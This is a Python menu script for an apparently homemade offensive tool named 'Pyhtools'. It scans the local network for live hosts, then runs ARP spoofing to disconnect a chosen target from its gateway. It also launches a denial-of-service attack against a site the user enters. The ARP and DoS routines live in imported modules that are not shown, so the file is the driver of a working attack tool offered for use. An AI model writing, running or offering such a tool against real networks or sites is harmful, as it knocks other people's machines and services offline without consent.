from modulesTools import dos, arp
import os,  sys, time
import threading

Green = '\033[92m'
Blue = '\033[94m'
Grey = '\033[0m'
Red = '\033[31m'
White = '\33[97m'
Yellow = '\33[93m'

# BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def banner():
    print(Green + '''
              .__     __                .__          
______ ___.__.|  |___/  |_  ____   ____ |  |   ______
\____ <   |  ||  |  \   __\/  _ \ /  _ \|  |  /  ___/
|  |_> >___  ||   Y  \  | (  <_> |  <_> )  |__\___ \ 
|   __// ____||___|  /__|  \____/ \____/|____/____  >
|__|   \/          \/                             \/ 

    ''' + 'Author: T1009\tEmail: 504733997@qq.com\n' + Grey)


def choice():
    print(Yellow + 'Choice Menu:' + Grey)
    print('     1. ARP disconnection')
    print('     2. DoS attack')
    print('     3. Exit\n')

def scanningAnimation(text):
    try:
        global stopAnimation
        i = 0
        while stopAnimation is not True:
            tempText = list(text)
            if i >= len(tempText):
                i = 0
            tempText[i] = tempText[i].upper()
            tempText = ''.join(tempText)
            sys.stdout.write(Green + tempText + '\r' + Grey)
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
    except:
        os._exit(1)


def header(name):
    return '{}{}{}> {}'.format(Blue, name, White, Grey)


def shutdown():
    print(Green + '[!] Thank you for your use!' + Grey)


if __name__ == '__main__':
    banner()
    choice()

    c = input(header('Pyhtools'))

    if c == '1':
        os.system('cls || clear')
        global stopAnimation
        stopAnimation  = False
        t = threading.Thread(target=scanningAnimation, args=('Scanning your network, hang on...',))
        t.daemon = True
        t.start()

        try:
            hostlist = arp.onlineIp()
        except KeyboardInterrupt:
            shutdown()
        
        stopAnimation = True

        os.system('cls || clear')
        print(Green + 'OnLineIp: ' + Grey + '\n')
        for i in range(len(hostlist)):
            print('     [{}{}{}]: {}\t\t{}'.format(Yellow,i, Grey, hostlist[i][0], hostlist[i][1]))
        
        try:
            target = int(input('\n' + header('ArpAttack')))
            pkt = int(input('\n' + header('ArpAttack pkt'))) # 每秒发送的包

            _, my_mac = arp.getMyIp_Mac()
            gateway_ip, _ = arp.getGateWayIp_Mac()
            target_ip, target_mac = hostlist[target][0], hostlist[target][1]

            print(Green + 'Spoofing started...' + Grey)

            arp.arpAttack(my_mac, gateway_ip, target_ip, target_mac, pkt)

        except KeyboardInterrupt:
            shutdown()
            os._exit(0)

        except ValueError or IndexError:
            sys.exit(Red + '[!] valid input, exit !' + Grey)


    elif c == '2':
        os.system('cls || clear')
        site = input(header('Site'))
        DosAttack = dos.DOS(site)
        try:
            DosAttack.start_attack()
        except KeyboardInterrupt:
            shutdown()
            os._exit(0)
    
    elif c == '3':
        shutdown()
        os._exit(0)